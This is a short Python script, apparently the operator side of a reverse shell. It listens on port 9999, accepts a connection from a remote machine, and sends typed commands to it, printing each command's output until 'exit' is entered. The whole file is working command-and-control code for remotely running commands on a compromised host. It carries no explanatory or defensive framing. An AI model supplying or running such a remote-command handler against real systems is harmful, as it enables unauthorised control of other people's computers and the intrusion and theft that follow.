import socket
import os

server = socket.socket()
HOST = "0.0.0.0"
PORT = 9999 # CHANGE THIS
server.bind((HOST, PORT))
server.listen()
print("WAITING FOR CONNECTIONS...")

client_socket, client_tuple = server.accept()
print(f"Connection established with {client_tuple[0]} on port {client_tuple[1]}")

while True:
    command = input("CMD> ")
    if command == "exit":
        break
    client_socket.send(command.encode())
    command_output = client_socket.recv(1024).decode()
    print(command_output)

client_socket.close()
server.close()
